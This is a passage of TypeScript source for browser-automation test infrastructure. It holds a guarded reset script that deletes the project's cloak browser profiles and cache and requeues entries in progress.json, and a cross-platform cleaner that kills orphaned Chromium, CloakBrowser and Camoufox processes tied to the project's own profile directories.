 * Destructive by default; pass --dry to preview without writing anything.
 */
import "dotenv/config";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import * as readline from "readline/promises";
import { getStaticCacheDir } from "../stealth/static-cache.js";
import { createLogger } from "../core/logger.js";

const log = createLogger("hard-reset");
const DRY_RUN = process.argv.includes("--dry");
const FORCE = process.argv.includes("--force") || process.env.HARD_RESET_CONFIRM === "1";

async function rmrf(target: string): Promise<boolean> {
  if (!fs.existsSync(target)) return false;
  if (DRY_RUN) { log.info(`(dry-run) would remove ${target}`); return true; }
  await fs.promises.rm(target, { recursive: true, force: true });
  return true;
}

function profileRoots(): string[] {
  const out = new Set<string>();
  const env = (process.env.CLOAK_PROFILE_DIR || "").trim();
  if (env) out.add(path.resolve(env));
  out.add(path.join(os.tmpdir(), "cloak-profiles"));
  out.add(path.join(process.cwd(), "cloak-profiles"));
  return [...out];
}

async function resetProgressJson(file = "progress.json"): Promise<{ rowsTouched: number; sitesReset: number }> {
  if (!fs.existsSync(file)) { log.info(`${file} absent — skipping progress reset`); return { rowsTouched: 0, sitesReset: 0 }; }
  const raw = await fs.promises.readFile(file, "utf-8");
  let data: { rows?: Array<{ sites?: Record<string, { outcome?: string; attempts?: number; error?: string }>; status?: string }>; updatedAt?: string; [key: string]: unknown };
  try { data = JSON.parse(raw); } catch (e: unknown) {
    log.error(`${file} is not valid JSON (${e instanceof Error ? e.message : String(e)}); refusing to mutate`);
    return { rowsTouched: 0, sitesReset: 0 };
  }
  if (!Array.isArray(data?.rows)) { log.warn(`${file} has no .rows[] — nothing to reset`); return { rowsTouched: 0, sitesReset: 0 }; }
  let rowsTouched = 0;
  let sitesReset = 0;
  for (const row of data.rows) {
    if (!row?.sites || typeof row.sites !== "object") continue;
    let rowTouched = false;
    for (const siteName of Object.keys(row.sites)) {
      const site = row.sites[siteName];
      const err: string = site?.error ?? "";
      const looksLikeMisdirection = site?.outcome === "N/A" && (
        err.startsWith("misdirection:") || err.startsWith("requeued:")
      );
      if (looksLikeMisdirection) {
        site.outcome = "queued";
        site.attempts = 0;
        delete site.error;
        sitesReset++;
        rowTouched = true;
      }
    }
    if (rowTouched) {
      rowsTouched++;
      // If no site is in a terminal state any more, the row goes back to queued.
      const anyTerminal = Object.values(row.sites).some((s) =>
        s?.outcome && !["queued", "testing"].includes(s.outcome));
      if (!anyTerminal && row.status !== "queued") row.status = "queued";
    }
  }
  if (rowsTouched === 0) {
    log.info(`${file} contains no misdirection rows — nothing to do`);
    return { rowsTouched, sitesReset };
  }
  if (DRY_RUN) {
    log.info(`(dry-run) would reset ${sitesReset} site(s) across ${rowsTouched} row(s) in ${file}`);
    return { rowsTouched, sitesReset };
  }
  data.updatedAt = new Date().toISOString();
  const tmp = `${file}.tmp`;
  await fs.promises.writeFile(tmp, JSON.stringify(data, null, 2));
  await fs.promises.rename(tmp, file);
  return { rowsTouched, sitesReset };
}

async function confirmDestructiveReset(): Promise<void> {
  if (DRY_RUN || FORCE) return;
  if (!process.stdin.isTTY) {
    throw new Error("Refusing destructive hard reset without an interactive TTY. Re-run with --dry or --force.");
  }
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  try {
    const answer = await rl.question('This will delete cloak profiles/static cache and mutate progress.json. Type "RESET" to continue: ');
    if (answer !== "RESET") throw new Error("Hard reset cancelled");
  } finally {
    rl.close();
  }
}

async function main(): Promise<void> {
  await confirmDestructiveReset();
  log.info(DRY_RUN ? "DRY RUN — no files will be modified" : "executing hard reset");

  for (const root of profileRoots()) {
    if (await rmrf(root)) log.info(`removed profile root: ${root}`);
    else log.info(`profile root absent: ${root}`);
  }

  const staticCache = getStaticCacheDir();
  if (await rmrf(staticCache)) log.info(`removed static cache: ${staticCache}`);
  else log.info(`static cache absent: ${staticCache}`);

  const { rowsTouched, sitesReset } = await resetProgressJson("progress.json");
  log.info(`progress.json: ${sitesReset} site outcome(s) reset across ${rowsTouched} row(s)`);

  log.info(DRY_RUN ? "dry run complete" : "hard reset complete");
}

main().catch((err: unknown) => { log.error(err instanceof Error ? err.message : String(err)); process.exit(1); });

/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-expressions, @typescript-eslint/no-unused-vars, @typescript-eslint/require-await */
/**
 * Global zombie-process cleaner for the testing infrastructure.
 *
 * Scope is intentionally narrow: we only ever touch Chromium / CloakBrowser
 * processes whose `--user-data-dir` points into one of OUR profile roots
 * (CLOAK_PROFILE_DIR, $TMPDIR/cloak-profiles, or the repo root). The user's
 * normal Chrome — and any other Playwright project on the box — is safe.
 *
 * Cross-platform: uses `ps -axo` on Unix and `wmic process` on Windows.
 *
 * Surfaces:
 *   findOurOrphans({ minEtimeSec })      → list candidate PIDs
 *   killOurOrphans({ timeoutMs, dryRun}) → SIGTERM, then SIGKILL after timeout
 *   cleanPreviousZombies(opts)           → pre-flight, called at test startup
 *   installGlobalCleanupHandlers(opts)   → SIG*, uncaught*, unhandled* hooks
 */
import { exec, execSync } from "child_process";
import { promisify } from "util";
import * as os from "os";
import * as path from "path";
import { createLogger } from "../core/logger.js";

const IS_WINDOWS = os.platform() === "win32";

function makeLogger(subLabel?: string) {
  return createLogger(subLabel ? `zombie-cleaner:${subLabel}` : "zombie-cleaner");
}

// ─── Protected Process Registry ─────────────────────────────────────────────
// Dashboard Chrome and other server-owned browser processes must never be
// killed by the zombie cleaner.  Two complementary mechanisms:
//   1. PID-based:  protectPid() / unprotectPid() — guards the exact PID tree
//   2. Path-based: PROTECTED_USER_DATA_DIRS — guards the user-data-dir path

const protectedPids = new Set<number>();

/** Mark a PID as server-owned so the zombie reaper will never kill it. */
export function protectPid(pid: number): void   { protectedPids.add(pid); }
/** Remove a PID from the protection list (call on process exit). */
export function unprotectPid(pid: number): void { protectedPids.delete(pid); }

/**
 * Directories whose browser processes are server-owned infrastructure, NOT
 * orphans.  Any Chrome/Firefox with --user-data-dir matching one of these
 * (exact or child path) is unconditionally exempt from cleanup.
 *
 * NOTE: Uses the **basename** for portability — any user-data-dir whose final
 * path component matches is protected, regardless of the absolute path prefix.
 */
const PROTECTED_USER_DATA_DIR_BASENAMES = new Set<string>([
  ".chrome-dashboard",   // CDP-enabled dashboard Chrome
]);

/** Register an additional user-data-dir basename as protected at runtime. */
export function protectUserDataDir(basename: string): void {
  PROTECTED_USER_DATA_DIR_BASENAMES.add(basename);
}

/** Check whether a user-data-dir path is protected from cleanup. */
function isProtectedUserDataDir(uddPath: string): boolean {
  const resolved = path.resolve(uddPath);
  const base = path.basename(resolved);
  return PROTECTED_USER_DATA_DIR_BASENAMES.has(base);
}

type Found = { pid: number; etimeSec: number; cmd: string };

function getProfileRoots(): string[] {
  const roots = new Set<string>();
  const envRoot = (process.env.CLOAK_PROFILE_DIR || "").trim();
  if (envRoot) roots.add(path.resolve(envRoot));
  roots.add(path.join(os.tmpdir(), "cloak-profiles"));
  // The repo root catches anything Playwright drops under cwd (recordings, tmp, etc).
  roots.add(path.resolve(process.cwd()));
  return Array.from(roots);
}

function parseEtimeToSeconds(et: string): number {
  // ps etime format: [[DD-]HH:]MM:SS
  const m = et.match(/^(?:(\d+)-)?(?:(\d+):)?(\d+):(\d+)$/);
  if (!m) return 0;
  const d = m[1] ? parseInt(m[1], 10) : 0;
  const h = m[2] ? parseInt(m[2], 10) : 0;
  // @ts-expect-error noUncheckedIndexedAccess
  const mm = parseInt(m[3], 10);
  // @ts-expect-error noUncheckedIndexedAccess
  const ss = parseInt(m[4], 10);
  return d * 86400 + h * 3600 + mm * 60 + ss;
}

/** Browser process names — used on both platforms. */
const BROWSER_EXE_NAMES = [
  "chromium", "chrome", "google chrome", "cloakbrowser",
  "cloak-browser", "firefox", "camoufox",
];

function looksLikeBrowserProcess(cmd: string): boolean {
  return /(^|\/)(chromium|chrome|google chrome|cloakbrowser|cloak-browser|firefox|camoufox)(\s|$)/i.test(cmd) ||
    /\b(chromium|chrome|cloakbrowser|cloak-browser|firefox|camoufox)\b/i.test(cmd);
}

/** Windows-specific: match image name against known browser executables. */
function looksLikeBrowserExe(imageName: string): boolean {
  const lower = imageName.toLowerCase().replace(/\.exe$/i, "");
  return BROWSER_EXE_NAMES.some((name) => lower === name.replace(/\s/g, "")) ||
    /^(chromium|chrome|cloakbrowser|cloak-browser|firefox|camoufox)$/i.test(lower);
}

function extractUserDataDir(cmd: string): string | undefined {
  const quoted = cmd.match(/(?:--user-data-dir=|--profile=|-profile\s+)("([^"]+)"|'([^']+)'|(\S+))/);
  if (!quoted) return undefined;
  // Extract from the first available capture group
  return (quoted[2] || quoted[3] || quoted[4] || "").replace(/^['"]|['"]$/g, "");
}

const execAsync = promisify(exec);

// ─── Windows WMI CreationDate parser ──────────────────────────────────────────
// WMI CreationDate format: "20260610070000.000000+600"


// ─── Windows process discovery ──────────────────────────────────────────────

async function findOurOrphansWindows(opts: { minEtimeSec?: number; excludePids?: number[] }): Promise<Found[]> {
  const log = makeLogger("win-discovery");
  const roots = getProfileRoots();
  const excludeSelf = new Set<number>([process.pid, ...(opts.excludePids ?? []), ...protectedPids]);
  const found: Found[] = [];

  // Strategy 1: Use PowerShell Get-CimInstance for reliable command-line extraction.
  // wmic is deprecated on modern Windows; PowerShell is universally available.
  try {
    const psCmd = `powershell -NoProfile -Command "Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'chrome|chromium|firefox|camoufox|cloakbrowser' } | Select-Object ProcessId,CommandLine,CreationDate | ConvertTo-Csv -NoTypeInformation"`;
    const { stdout } = await execAsync(psCmd, { maxBuffer: 10 * 1024 * 1024, timeout: 15000 });

    const lines = stdout.split(/\r?\n/).filter((l) => l.trim());
    // First line is CSV header: "ProcessId","CommandLine","CreationDate"
    for (let i = 1; i < lines.length; i++) {
      const line = lines[i]!;
      // Parse CSV — fields are double-quoted
      const fields = parseCsvLine(line);
      if (fields.length < 3) continue;

      const pid = parseInt(fields[0]!, 10);
      if (isNaN(pid) || excludeSelf.has(pid)) continue;

      const cmdLine = fields[1] || "";
      const creationDateStr = fields[2] || "";

      // Compute etime from creation date
      let etimeSec = 0;
      if (creationDateStr) {
        // PowerShell outputs dates like "6/10/2026 5:00:00 PM" or ISO format
        try {
          const created = new Date(creationDateStr);
          if (!isNaN(created.getTime())) {
            etimeSec = Math.max(0, Math.floor((Date.now() - created.getTime()) / 1000));
          }
        } catch { /* ignore parse errors */ }
      }

      if (!looksLikeBrowserProcess(cmdLine) && !looksLikeBrowserExe(cmdLine.split(/[\\\/]/).pop() || "")) continue;

      // Check --user-data-dir scoping
      const udd = extractUserDataDir(cmdLine);
      if (udd) {
        // Skip server-owned browser directories (dashboard Chrome, etc.)
        if (isProtectedUserDataDir(udd)) continue;
        const dir = path.resolve(udd);
        if (!roots.some((r) => dir === r || dir.startsWith(r + path.sep))) continue;
      }
      // On Windows, if no --user-data-dir in command line, still match camoufox unconditionally
      // (Camoufox uses -profile which may not be detected, and zombie camoufox MUST be killed)
      if (!udd && !/(camoufox)/i.test(cmdLine)) continue;

      if (opts.minEtimeSec != null && etimeSec < opts.minEtimeSec) continue;

      found.push({ pid, etimeSec, cmd: sanitizeCmd(cmdLine || `[pid:${pid}]`) });
    }
  } catch (e: unknown) {
    log.warn(`PowerShell discovery failed: ${e instanceof Error ? e.message : String(e)}. Falling back to tasklist.`);
    // Strategy 2: Fallback — use tasklist to at least find browser processes by name
    return findOurOrphansTasklist(opts);
  }

  return found;
}

/** Minimal fallback: tasklist can find processes by image name but has no command-line info.
 *  This catches camoufox.exe zombies unconditionally (no --user-data-dir filtering). */
async function findOurOrphansTasklist(opts: { minEtimeSec?: number; excludePids?: number[] }): Promise<Found[]> {
  const excludeSelf = new Set<number>([process.pid, ...(opts.excludePids ?? [])]);
  const found: Found[] = [];
  const targets = ["camoufox.exe", "cloakbrowser.exe"];

  for (const exe of targets) {
    try {
      const { stdout } = await execAsync(`tasklist /FI "IMAGENAME eq ${exe}" /FO CSV /NH`, { timeout: 10000 });
      for (const line of stdout.split(/\r?\n/)) {
        const fields = parseCsvLine(line);
        if (fields.length < 2) continue;
        const pid = parseInt(fields[1]!, 10);
        if (isNaN(pid) || excludeSelf.has(pid)) continue;
        // No etime available from tasklist — use 0 (matches everything unless minEtimeSec is set)
        if (opts.minEtimeSec != null && opts.minEtimeSec > 0) continue;
        found.push({ pid, etimeSec: 0, cmd: `${exe} [pid:${pid}]` });
      }
    } catch { /* tasklist failed for this exe — skip */ }
  }

  return found;
}

/** Parse a single CSV line respecting double-quoted fields. */
function parseCsvLine(line: string): string[] {
  const fields: string[] = [];
  let current = "";
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]!;
    if (inQuotes) {
      if (ch === '"') {
        if (i + 1 < line.length && line[i + 1] === '"') {
          current += '"'; // Escaped quote
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        current += ch;
      }
    } else {
      if (ch === '"') {
        inQuotes = true;
      } else if (ch === ',') {
        fields.push(current.trim());
        current = "";
      } else {
        current += ch;
      }
    }
  }
  fields.push(current.trim());
  return fields;
}

// ─── Unix process discovery (original) ──────────────────────────────────────

async function findOurOrphansUnix(opts: { minEtimeSec?: number; excludePids?: number[] }): Promise<Found[]> {
  const roots = getProfileRoots();
  const excludeSelf = new Set<number>([process.pid, ...(opts.excludePids ?? []), ...protectedPids]);
  let stdout = "";
  try {
    const { stdout: out } = await execAsync("ps -axo pid=,etime=,command=");
    stdout = out;
  } catch {
    return [];
  }

  const found: Found[] = [];
  for (const line of stdout.split("\n")) {
    const m = line.match(/^\s*(\d+)\s+(\S+)\s+(.+)$/);
    if (!m) continue;
    // @ts-expect-error noUncheckedIndexedAccess
    const pid = parseInt(m[1], 10);
    if (excludeSelf.has(pid)) continue;
    // @ts-expect-error noUncheckedIndexedAccess
    const etimeSec = parseEtimeToSeconds(m[2]);
    // @ts-expect-error noUncheckedIndexedAccess
    const cmd = sanitizeCmd(m[3]);
    if (!looksLikeBrowserProcess(cmd)) continue;
    // Require an explicit --user-data-dir flag that lands inside one of our roots.
    const udd = extractUserDataDir(cmd);
    if (udd) {
      // Skip server-owned browser directories (dashboard Chrome, etc.)
      if (isProtectedUserDataDir(udd)) continue;
      const dir = path.resolve(udd);
      if (!roots.some((r) => dir === r || dir.startsWith(r + path.sep))) continue;
    } else {
      // On Unix, if no --user-data-dir in command line, still match camoufox unconditionally
      // (Camoufox uses -profile which may not be detected, and zombie camoufox MUST be killed)
      if (!/(camoufox)/i.test(cmd)) continue;
    }
    if (opts.minEtimeSec != null && etimeSec < opts.minEtimeSec) continue;
    found.push({ pid, etimeSec, cmd });
  }
  return found;
}

// ─── Cross-platform entry point ─────────────────────────────────────────────

export async function findOurOrphans(opts: { minEtimeSec?: number; excludePids?: number[] } = {}): Promise<Found[]> {
  return IS_WINDOWS
    ? findOurOrphansWindows(opts)
    : findOurOrphansUnix(opts);
}

/** Strip ASCII control characters that could interfere with regex parsing. */
function sanitizeCmd(cmd: string): string {
  return cmd.replace(/[\x00-\x1F\x7F]/g, '');
}

// ─── Cross-platform kill helpers ────────────────────────────────────────────

function sendSignal(pid: number, sig: "SIGTERM" | "SIGKILL"): boolean {
  if (IS_WINDOWS) {
    // On Windows, process.kill() only works for Node child processes.
    // Use taskkill for reliable killing of arbitrary PIDs.
    try {
      execSync(`taskkill /F /T /PID ${pid}`, { stdio: "ignore", timeout: 5000 });
      return true;
    } catch { return false; }
  }
  try { process.kill(pid, sig); return true; } catch { return false; }
}

function pidAlive(pid: number): boolean {
  if (IS_WINDOWS) {
    try {
      const out = execSync(`tasklist /FI "PID eq ${pid}" /FO CSV /NH`, { timeout: 5000, encoding: "utf-8" });
      // tasklist returns "INFO: No tasks are running..." if PID not found
      return !out.includes("No tasks") && out.includes(String(pid));
    } catch { return false; }
  }
  try { process.kill(pid, 0); return true; } catch { return false; }
}

async function delay(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

export async function killOurOrphans(opts: { timeoutMs?: number; dryRun?: boolean; minEtimeSec?: number; excludePids?: number[] } = {}): Promise<{ killed: number; survived: number; dryRun: number }> {
  const timeout = opts.timeoutMs ?? 5000;
  const found = await findOurOrphans({ minEtimeSec: opts.minEtimeSec, excludePids: opts.excludePids });
  if (found.length === 0) return { killed: 0, survived: 0, dryRun: 0 };
  if (opts.dryRun) return { killed: 0, survived: 0, dryRun: found.length };

  if (IS_WINDOWS) {
    // Windows: taskkill /F is already a hard kill, no SIGTERM/SIGKILL dance needed
    let killed = 0, survived = 0;
    for (const f of found) {
      const ok = sendSignal(f.pid, "SIGKILL");
      if (ok) {
        killed++;
      } else {
        if (pidAlive(f.pid)) {
          survived++;
        } else {
          killed++; // Process is dead (taskkill probably threw because it was already gone)
        }
      }
    }
    return { killed, survived, dryRun: 0 };
  }

  // Unix: graceful SIGTERM → wait → SIGKILL
  for (const f of found) sendSignal(f.pid, "SIGTERM");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline && found.some((f) => pidAlive(f.pid))) {
    await delay(150);
  }
  let killed = 0, survived = 0;
  for (const f of found) {
    if (!pidAlive(f.pid)) { killed++; continue; }
    sendSignal(f.pid, "SIGKILL");
    await delay(50);
    if (pidAlive(f.pid)) survived++; else killed++;
  }
  return { killed, survived, dryRun: 0 };
}

export async function cleanPreviousZombies(opts: { label?: string; minEtimeSec?: number; timeoutMs?: number } = {}): Promise<void> {
  // Pre-flight: only target processes older than 5s by default so we never
  // race with siblings that this same operator is intentionally running.
  const minEtimeSec = opts.minEtimeSec ?? 5;
  const found = await findOurOrphans({ minEtimeSec });
  if (found.length === 0) return;
  const log = makeLogger(opts.label);
  log.info(`found ${found.length} orphan Chromium PID(s) older than ${minEtimeSec}s — cleaning`);
  const r = await killOurOrphans({ timeoutMs: opts.timeoutMs ?? 5000, minEtimeSec });
  log.info(`cleanup: killed=${r.killed} survived=${r.survived}`);
}

let reaperInterval: NodeJS.Timeout | null = null;

export function startPeriodicZombieReaper(intervalMs: number = 30000, minEtimeSec: number = 30): void {
  if (reaperInterval) return;
  const log = makeLogger('periodic');
  log.info(`Starting periodic zombie reaper (interval: ${intervalMs}ms, minEtime: ${minEtimeSec}s, platform: ${os.platform()})`);
  reaperInterval = setInterval(async () => {
    try {
      const found = await findOurOrphans({ minEtimeSec });
      if (found.length > 0) {
        log.warn(`Reaper detected ${found.length} stalled zombie browsers older than ${minEtimeSec}s. Terminating...`);
        const r = await killOurOrphans({ timeoutMs: 5000, minEtimeSec });
        log.info(`Reaper result: killed=${r.killed} survived=${r.survived}`);
      }
    } catch {
      log.warn('Reaper failed to scan for zombies');
    }
  }, intervalMs);
  reaperInterval.unref?.();
}

export function stopPeriodicZombieReaper(): void {
  if (reaperInterval) {
    clearInterval(reaperInterval);
    reaperInterval = null;
    const log = makeLogger('periodic');
    log.info('Stopped periodic zombie reaper');
  }
}

